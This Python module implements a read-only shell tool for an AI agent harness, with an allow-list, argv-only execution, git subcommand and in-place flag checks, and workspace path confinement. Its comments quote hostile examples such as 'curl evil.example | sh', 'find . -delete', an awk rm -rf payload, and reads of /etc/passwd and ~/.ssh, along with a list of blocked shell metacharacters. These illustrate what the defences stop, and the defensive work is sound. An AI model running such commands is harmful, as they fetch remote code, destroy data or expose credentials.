"""`shell_command` -- run one allow-listed program, with an argument list instead of a string.

The argument list is the primary defence, and it is worth being precise about why: a *string*
argument ("grep -rn foo .") has to be handed to a shell to become a program, and a shell is
where ``;``, ``|``, ``$(...)``, backticks and redirection live. Once a shell is in the path, the
allow-list below is decoration -- ``cat`` is allowed, and ``cat x; curl evil.example | sh``
starts with ``cat``. Passing ``argv`` as a list and running it with ``shell=False`` removes the
interpreter entirely: there is no stage at which the model's text is *parsed* as a command.

The binary allow-list is necessary but nowhere near sufficient, and the clauses after it carry
as much weight:

* ``find`` is allowed, and ``find . -delete`` empties the repository;
* ``sed`` and ``awk`` are allowed, and ``sed -i``/``awk -i inplace`` rewrite files in place;
* ``git`` is allowed, and ``git commit``/``git checkout``/``git clean -fdx`` are writes;
* every one of them is allowed, and ``cat /etc/passwd``, ``grep -r . ~/.ssh`` and
  ``ls /` read *outside* the workspace, which is the whole reason the tree is at arm's length.

So there are three independent layers -- binary, subcommand, argument -- and the tests exercise
each one separately, exactly like a reviewer would.

What this tool deliberately does **not** do: return the environment. ``env``/``printenv`` are not
on the allow-list, and the result never carries ``os.environ``, because the harness process may
hold API keys and the model's context ends up in a report. A command that could read the
environment is a command that can be prompt-injected into sending it somewhere the transcript
goes.
"""

from __future__ import annotations

import shlex
import shutil
import subprocess
import time
from pathlib import Path
from typing import Any

from aegis_contracts.harness import ShellCommandPolicy, ToolName, ToolResult
from services.harness.tools.base import ToolContext
from services.harness.tools.paths import (
    ToolArgumentError,
    looks_like_path,
    resolve_in_workspace,
)
from services.harness.tools.support import clip

#: Characters that only mean something to a shell. A `;`, a backtick, `$(`, `&&` or a newline
#: inside a single argument is either an attempt to reach a shell or a filename so hostile it
#: should be looked at by a human -- and no legitimate path, pattern or glob needs one.
#:
#: `|`, `>` and `<` are *not* in this list, deliberately: they are inert without a shell, and
#: refusing `|` would refuse every grep alternation (`grep -E "foo|bar"`), which is a routine
#: and legitimate call. Refusing a character that cannot do anything is how an allow-list earns
#: its reputation for being unusable and then gets loosened somewhere that matters.
_SHELL_SEQUENCERS = (";", "`", "$(", "&&", "||", "\n", "\r", "$'", "${")

#: Binaries whose non-option arguments are **programs** rather than data. `awk 'BEGIN{system("rm -rf
#: /")}'` and `sed -n 'w /etc/passwd'` both write, so for these the policy's forbidden words stay a
#: containment test.
#:
#: Everywhere else the arguments are patterns, paths and predicates, and containment was pure noise.
#: Measured on the Java benchmark: `grep permitAll` refused because the word contains "rm", `grep
#: addInterceptors` refused because it contains "add", `grep --include=*.java` refused because it
#: contains "-i" -- 17 of 43 shell calls, 40% -- and the agent's fallback searches then returned
#: nothing, so the authorization configuration was never actually read. None of those refusals
#: prevented a write.
_SCRIPT_ARGUMENT_BINARIES = frozenset({"awk", "gawk", "mawk", "nawk", "sed"})

#: Options whose meaning depends on the binary, and which are therefore enforced only where they
#: mean "write". `-i` is in-place for `sed`/`awk` and ignore-case for `grep`; refusing `grep -i` cost
#: a legitimate case-insensitive search and bought nothing.
_AMBIGUOUS_FLAGS = frozenset({"i"})

#: Which binaries give those options the writing meaning.
_BINARY_SCOPED_FLAGS: dict[str, frozenset[str]] = {
    "sed": frozenset({"i", "in-place"}),
    "awk": frozenset({"i", "in-place"}),
    "gawk": frozenset({"i", "in-place"}),
    "mawk": frozenset({"i", "in-place"}),
    "nawk": frozenset({"i", "in-place"}),
}


#: The policy's *word* entries (`commit`, `checkout`, `clean`, `add`, `rm`, ...) are `git`
#: subcommands. They only mean "write" for the binary that has them as subcommands: `clean` is a
#: search term to `grep` and a working-tree wipe to `git`, and refusing `grep clean` is the same
#: false positive as refusing `grep permitAll`. So the words are enforced on `git` alone, and in the
#: subcommand *position* rather than anywhere in the argument list.
_SUBCOMMAND_BINARIES = frozenset({"git"})

#: Global `git` options that consume the next argument, so the subcommand is not mistaken for one of
#: their values (`git -C /repo log`).
_GIT_OPTIONS_WITH_VALUE = frozenset(
    {"-C", "-c", "--git-dir", "--work-tree", "--namespace", "--config-env", "--exec-path"}
)


def _flag_name(argument: str) -> str | None:
    """`-i`, `-i.bak`, `--in-place=x` -> `i`, `i.bak`, `in-place`; None when it is not an option.

    Comparing flag *names* rather than raw strings is what lets one policy entry cover both
    spellings the binaries use (`find -delete`, `sed --in-place`) without reopening the substring
    hole -- the policy list contains `in-place` with no dashes, which equality alone could never
    have matched.
    """
    if not argument.startswith("-") or argument == "-":
        return None
    return argument.lstrip("-").split("=", 1)[0]

#: Program suffixes stripped before matching the allow-list, because Windows hands back
#: `python.EXE` from `shutil.which("python")`and the policy is written in the names a human
#: types.
_EXE_SUFFIXES = (".exe", ".cmd", ".bat", ".com")


class ShellCommandTool:
    """Run one program from the policy's allow-list, inside the workspace."""

    name = ToolName.SHELL

    def schema(self) -> dict[str, Any]:
        return {
            "name": self.name.value,
            "description": (
                "运行一条只读命令。参数是 **argv 数组**，不是字符串——不存在 shell，"
                "所以 `;`、`|`、`$(...)`、重定向都不会被解释。程序名必须在只读白名单内，"
                "参数不得包含被禁止的子命令（如 `commit`、`-delete`、`-i`），"
                "参数中的路径必须落在工作区内。工作目录即工作区，超时会返回已产生的输出。"
            ),
            "parameters": {
                "type": "object",
                "properties": {
                    "argv": {
                        "type": "array",
                        "items": {"type": "string"},
                        "minItems": 1,
                        "description": (
                            "命令与参数，逐项分开：`[\"grep\", \"-rn\", \"password\", \"app/\"]`。"
                            "不要写成 \"grep -rn password app/\"。"
                        ),
                    },
                    "timeout_s": {
                        "type": "number",
                        "minimum": 0.1,
                        "description": "超时秒数，会被裁剪到策略上限内；超时返回部分输出而不是报错抛出。",
                    },
                },
                "required": ["argv"],
                "additionalProperties": False,
            },
        }

    def run(self, context: ToolContext, arguments: dict[str, Any]) -> ToolResult:
        policy = context.shell_policy
        try:
            argv = _argv_argument(arguments.get("argv"))
            # Order matters, and it is the order of the model's *request*: shape, then the
            # arguments, then the paths in them, and only then whether the program exists.
            # Resolving PATH first would answer "cat is not on PATH" to a call that asked for
            # `/etc/passwd` -- true, but it hides the refusal that actually matters, and it would
            # make the layer protecting the filesystem depend on which tools are installed.
            _check_arguments(argv, policy)
            _check_argument_paths(context, argv)
            resolved_bin = _resolve_binary(argv[0], policy)
            timeout = _timeout_argument(arguments.get("timeout_s"), policy)
        except ToolArgumentError as exc:
            return self._fail(str(exc), refused=exc.code, argv=arguments)

        timeout_clamped = _requested_timeout(arguments.get("timeout_s")) > policy.max_seconds

        started = time.monotonic()
        try:
            completed = subprocess.run(  # noqa: S603 - argv list, shell=False, allow-listed
                argv,
                shell=False,
                cwd=str(context.workspace),
                capture_output=True,
                timeout=timeout,
                check=False,
                # A closed stdin, so a program that reads it fails fast instead of hanging
                # until the timeout and returning nothing.
                stdin=subprocess.DEVNULL,
            )
        except subprocess.TimeoutExpired as exc:
            duration = time.monotonic() - started
            # The same byte cap as the success path: a command that printed megabytes before
            # hanging must not smuggle them into the blackboard through `data`. The partial
            # output is the reason the timeout branch exists at all, so it is kept -- capped,
            # and marked as capped.
            stdout, stderr, truncated = _cap_output(
                exc.stdout or b"", exc.stderr or b"", policy.max_output_bytes
            )
            summary = self._render(argv, policy, None, stdout, stderr, duration, timeout)
            summary += f"\n[命令在 {timeout:g}s 后超时，已被终止；以上是超时前已产生的输出]"
            if truncated:
                summary += f"\n[输出超过策略上限 {policy.max_output_bytes} 字节，已截断]"
            summary, clipped = clip(summary, context.limits.max_output_chars)
            return ToolResult(
                tool=self.name,
                ok=False,
                summary=summary,
                error=f"命令超时（{timeout:g}s 上限）：{argv[0]}",
                data={
                    "argv": argv,
                    "cwd": str(context.workspace),
                    "exit_code": None,
                    "timeout_s": timeout,
                    "timed_out": True,
                    "stdout": stdout,
                    "stderr": stderr,
                    "duration_s": round(duration, 3),
                    "truncated": truncated,
                },
                truncated=truncated or clipped,
            )
        except OSError as exc:
            return self._fail(f"无法启动 `{argv[0]}`：{exc}", refused="os_error", argv=argv)

        duration = time.monotonic() - started
        stdout, stderr, truncated = _cap_output(
            completed.stdout or b"", completed.stderr or b"", policy.max_output_bytes
        )
        summary = self._render(argv, policy, completed.returncode, stdout, stderr, duration, timeout)
        if truncated:
            summary += f"\n[输出超过策略上限 {policy.max_output_bytes} 字节，已截断]"
        if timeout_clamped:
            summary += f"\n[timeout_s 请求超过策略上限 {policy.max_seconds:g}s，已裁剪]"
        summary, clipped = clip(summary, context.limits.max_output_chars)
        if clipped:
            truncated = True

        ok = completed.returncode == 0 or _is_no_match(argv, completed.returncode)
        no_match = completed.returncode != 0 and ok
        if no_match:
            # Said in words, not just as a code. The model reads this line to decide whether its
            # search answered the question, and "退出码 1（无输出）" does not distinguish "grep says
            # nothing matches" from "the command broke".
            summary += (
                "\n[搜索完成，没有匹配：grep 系的退出码 1 表示“没有选中任何行”，"
                "这是结论，不是命令失败]"
            )
        return ToolResult(
            tool=self.name,
            ok=ok,
            summary=summary,
            error=None if ok else f"命令以退出码 {completed.returncode} 结束：{argv[0]}",
            data={
                "argv": argv,
                "binary": resolved_bin,
                "cwd": str(context.workspace),
                "exit_code": completed.returncode,
                # Explicit, so a reader (or a later stage) does not have to re-derive grep's exit
                # convention from the code. `False` for every command that is not a search.
                "no_match": no_match,
                "timeout_s": timeout,
                "timed_out": False,
                "stdout": stdout,
                "stderr": stderr,
                "duration_s": round(duration, 3),
                "truncated": truncated,
            },
            truncated=truncated,
        )

    # -- rendering ------------------------------------------------------
    def _render(
        self,
        argv: list[str],
        policy: ShellCommandPolicy,
        exit_code: int | None,
        stdout: str,
        stderr: str,
        duration: float,
        timeout: float,
    ) -> str:
        head = shlex.join(argv)
        code = "超时" if exit_code is None else f"退出码 {exit_code}"
        parts = [f"$ {head}", f"{code}（{duration:.3f}s，上限 {timeout:g}s）"]
        if stdout:
            parts.append(stdout.rstrip("\n"))
        if stderr:
            parts.append("[stderr]\n" + stderr.rstrip("\n"))
        if not stdout and not stderr:
            parts.append("（无输出）")
        return "\n".join(parts)

    def _fail(self, message: str, *, refused: str, argv: Any) -> ToolResult:
        return ToolResult(
            tool=self.name,
            ok=False,
            summary=f"已拒绝执行：{message}",
            error=message,
            data={"refused": refused, "argv": argv if isinstance(argv, list) else [str(argv)]},
        )


# ─────────────────────────────────────────────────────────── argument checks


def _argv_argument(value: Any) -> list[str]:
    """``argv`` must be a list of strings -- a string is refused, never split.

    Splitting a string here would put the tool back where it started: the quoting rules that
    decide where the split goes are a shell's rules, and getting them wrong is how "one
    argument" becomes two. Refusing costs the model one step and teaches the shape; splitting
    costs it a wrong answer it cannot detect.
    """
    if isinstance(value, str):
        raise ToolArgumentError(
            "`argv` 必须是数组，不是字符串；工具不会用 shell 执行它。"
            f"请写成 [\"{value.split()[0] if value.split() else 'ls'}\", ...] 的形式",
            code="argv_is_string",
        )
    if not isinstance(value, list) or not value:
        raise ToolArgumentError(
            "`argv` 必须是非空数组，例如 [\"grep\", \"-rn\", \"password\", \".\"]",
            code="argv_shape",
        )
    argv: list[str] = []
    for item in value:
        if not isinstance(item, str):
            raise ToolArgumentError(
                f"`argv` 的每一项都必须是字符串，收到 {type(item).__name__}",
                code="argv_item_type",
            )
        if not item:
            raise ToolArgumentError("`argv` 中不允许空字符串项", code="argv_item_empty")
        argv.append(item)
    return argv


def _check_arguments(argv: list[str], policy: ShellCommandPolicy) -> None:
    """Layer two: no shell sequencing, and no writing program, option or subcommand.

    Two matching rules, chosen by what each binary does with its arguments rather than by what is
    convenient:

    * a **program argument** -- the token typed as a program, and every argument of a binary that
      treats arguments as programs (``sed``, ``awk``: their script text can call ``system()`` and
      write files) -- is tested by containment, which is what the policy list was written for;
    * everywhere else the arguments are patterns and paths, so the policy is applied by **name**:
      equality for words (``commit``, ``rm``) and flag-name equality for options (``-delete``,
      ``--in-place``), with ``-i`` scoped to the binaries where it means in-place.

    The containment test used to apply to every argument of every binary. Measured cost on the Java
    benchmark: 24 of 50 shell calls refused, 48%, and the refusals landed on the vulnerable chain's
    own method names -- ``grep formatPath``, ``grep performQuickBackup`` and
    ``grep validateAndFormat`` were refused because those words contain "rm", ``grep
    addInterceptors`` because it contains "add", and ``--include=*.java`` because it contains "-i".
    The fallback searches then returned nothing (``退出码 1（无输出）``), so the searches that would
    have read the command-execution call chain never happened, and the refusal rate rose between runs
    as agents searched harder. None of those refusals prevented a write: the dangers this function's
    docstring used to cite (``sed -e 's/x/y/' -i``, ``git -c core.pager=... commit``) are carried by
    a *whole* argument, and equality still catches them.

    The program token is checked as a *name*, not as the path it may be written as. The allow-list
    already decides which program runs, and scanning the whole path for list words would refuse
    ``/home/clean-arch/bin/git`` over the substring ``clean`` -- a refusal that teaches the model
    nothing true.
    """
    program = Path(argv[0]).name or argv[0]
    _check_one_argument(program, position=1, program=program, policy=policy, containment=True)
    containment = program in _SCRIPT_ARGUMENT_BINARIES
    for position, arg in enumerate(argv[1:], start=2):
        _check_one_argument(
            arg, position=position, program=program, policy=policy, containment=containment
        )
    if program in _SUBCOMMAND_BINARIES:
        _check_git_subcommand(argv[1:], policy)


#: Binaries whose exit code 1 means "the search found nothing" rather than "the command failed".
#:
#: POSIX `grep` documents three codes: 0 = a line was selected, 1 = no line was selected, 2 = an
#: error. The tool layer called every non-zero code a failure, and on one audit of a five-file demo
#: **21 of the 22 "failed" calls were successful negative searches** -- `grep -rni -E
#: 'session|auth|owner|tenant|...' .` returning exit 1 with no output. That result is the evidence
#: for "this repository contains no authorization code at all", which is exactly what those
#: validators concluded from it. Recorded as a failure, the same evidence reads as "we could not
#: check", and a validator that trusted the record would reject a correct claim for the wrong reason.
#: `rg` follows the same convention; `git grep` has it behind a subcommand.
NO_MATCH_BINARIES = frozenset({"grep", "egrep", "fgrep", "rg"})


def _is_no_match(argv: list[str], exit_code: int) -> bool:
    """Whether a non-zero exit is a search's documented "no match" rather than a failure."""
    if exit_code != 1:
        return False
    program = Path(argv[0]).name or argv[0]
    if program in NO_MATCH_BINARIES:
        return True
    if program != "git":
        return False
    # `git grep`, found where git looks for its subcommand: past the global options that take a value.
    index = 0
    arguments = argv[1:]
    while index < len(arguments):
        if arguments[index] in _GIT_OPTIONS_WITH_VALUE:
            index += 2
            continue
        if arguments[index].startswith("-"):
            index += 1
            continue
        return arguments[index] == "grep"
    return False


def _check_git_subcommand(arguments: list[str], policy: ShellCommandPolicy) -> None:
    """Refuse a `git` subcommand that writes, found where git looks for it.

    Position, not containment, and not any argument: the policy's words are subcommands, and for
    every other binary an argument that spells one of them is a pattern. `-C <path>`, `-c <k=v>` and
    `--git-dir <path>` take a value, so the subcommand is the first argument after those.
    """
    words = {token for token in policy.forbidden_subcommands if not token.startswith("-")}
    index = 0
    while index < len(arguments):
        arg = arguments[index]
        if arg in _GIT_OPTIONS_WITH_VALUE:
            index += 2
            continue
        if arg.startswith("-"):
            index += 1
            continue
        break
    if index >= len(arguments):
        return  # `git` with no subcommand prints usage and exits
    subcommand = arguments[index]
    if subcommand in words:
        raise ToolArgumentError(
            f"git 子命令 {subcommand!r} 会写入工作区或远端（第 {index + 2} 项）。"
            "该工具是只读的：写操作必须由人在工作区外完成",
            code="forbidden_subcommand",
        )


def _check_one_argument(
    arg: str, *, position: int, program: str, policy: ShellCommandPolicy, containment: bool
) -> None:
    for bad in _SHELL_SEQUENCERS:
        if bad in arg:
            raise ToolArgumentError(
                f"参数含 shell 元字符 {bad!r}，已拒绝：{arg!r}（第 {position} 项）。"
                "这里没有 shell，`;`、`|`、`$(...)` 与反引号都不会被解释；"
                "请把命令拆成多次调用",
                code="shell_metacharacter",
            )

    if containment:
        for forbidden in policy.forbidden_subcommands:
            if forbidden in arg:
                raise ToolArgumentError(
                    f"参数 {arg!r} 含被禁止的子命令 {forbidden!r}（第 {position} 项）。"
                    "该工具是只读的：写操作必须由人在工作区外完成",
                    code="forbidden_subcommand",
                )
        return

    flag = _flag_name(arg)
    if flag is None:
        return
    option_names = {
        token.lstrip("-") for token in policy.forbidden_subcommands if token.startswith("-")
    }
    if flag in option_names and flag not in _AMBIGUOUS_FLAGS:
        raise ToolArgumentError(
            f"参数 {arg!r} 是被禁止的写选项（第 {position} 项）。"
            "该工具是只读的：写操作必须由人在工作区外完成",
            code="forbidden_subcommand",
        )
    scoped = _BINARY_SCOPED_FLAGS.get(program, frozenset())
    # `-i.bak` / `-ibak` are in-place writes too, and are not equal to `-i`; the flag name carries a
    # suffix, so the first character decides. Only for the binaries where `i` means in-place.
    if scoped and (flag in scoped or (len(flag) > 1 and flag[0] in scoped)):
        raise ToolArgumentError(
            f"参数 {arg!r} 是被禁止的写选项（第 {position} 项）：{program} 用它就地写入文件。"
            "该工具是只读的：写操作必须由人在工作区外完成",
            code="forbidden_subcommand",
        )


def _resolve_binary(binary: str, policy: ShellCommandPolicy) -> str:
    """Resolve through ``shutil.which`` and require the *basename* to be allow-listed.

    Resolving first and checking the basename afterwards is what stops ``/tmp/x/ls`` (an
    attacker-supplied "ls") from counting as ``ls``: the allow-list names programs, not paths,
    and only the resolved name says which program is actually about to run.
    """
    resolved = shutil.which(binary)
    if resolved is None:
        raise ToolArgumentError(
            f"找不到可执行文件 `{binary}`（不在 PATH 上）。请只使用白名单内的只读命令",
            code="binary_not_found",
        )
    name = _normalize_binary(Path(resolved).name)
    allowed = {_normalize_binary(item) for item in policy.allowed_binaries}
    if name not in allowed:
        raise ToolArgumentError(
            f"程序 `{name}` 不在只读白名单内，已拒绝。可用程序：{', '.join(sorted(allowed))}",
            code="binary_not_allowed",
        )
    return resolved


def _normalize_binary(name: str) -> str:
    """Lower-case, extension-stripped program name, so `python.EXE` matches `python`."""
    lowered = name.strip().lower()
    for suffix in _EXE_SUFFIXES:
        if lowered.endswith(suffix):
            return lowered[: -len(suffix)]
    return lowered


def _check_argument_paths(context: ToolContext, argv: list[str]) -> None:
    """Layer three: every path-looking argument must resolve inside the workspace.

    ``argv[0]`` is exempt because it is resolved through PATH and its basename is already held
    to the allow-list; every later element is checked. A bare name (``repo.py``) is not a path
    for this purpose -- the working directory is the workspace, so it cannot reach anywhere
    else -- while a rooted path, a ``..``, a ``~`` or anything with a separator is.
    """
    for arg in argv[1:]:
        if not looks_like_path(arg):
            continue
        if arg.startswith("~"):
            raise ToolArgumentError(
                f"参数 {arg!r} 使用了 `~`，但这里没有 shell 会展开它；请写工作区内的相对路径",
                code="tilde_path",
            )
        resolve_in_workspace(context.workspace, arg, label="命令参数路径")


def _timeout_argument(value: Any, policy: ShellCommandPolicy) -> float:
    """Clamp to the policy's ceiling; a missing or unusable value means the ceiling."""
    requested = _requested_timeout(value)
    if requested <= 0:
        return policy.max_seconds
    return min(requested, policy.max_seconds)


def _requested_timeout(value: Any) -> float:
    if value is None:
        return 0.0
    if isinstance(value, bool):
        return 0.0
    if isinstance(value, (int, float)):
        return float(value)
    if isinstance(value, str):
        try:
            return float(value.strip())
        except ValueError:
            return 0.0
    return 0.0


# ─────────────────────────────────────────────────────────── output


def _decode(raw: bytes | str | None) -> str:
    if raw is None:
        return ""
    if isinstance(raw, str):
        return raw
    return raw.decode("utf-8", "replace")


def _cap_output(stdout: bytes, stderr: bytes, budget: int) -> tuple[str, str, bool]:
    """Keep the head of stdout, then whatever budget is left for stderr.

    stdout first because it is the answer the command was run for; stderr keeps the head of what
    remains, since a traceback's *first* lines say what failed. Bytes rather than characters,
    because the policy is written in bytes and a UTF-8 file is 1-3 bytes per character -- a
    character cap would let a CJK-heavy output through at three times the intended size.
    """
    truncated = False
    if len(stdout) > budget:
        stdout, truncated = stdout[:budget], True
    remaining = max(0, budget - len(stdout))
    if len(stderr) > remaining:
        stderr, truncated = stderr[:remaining], True
    return _decode(stdout), _decode(stderr), truncated
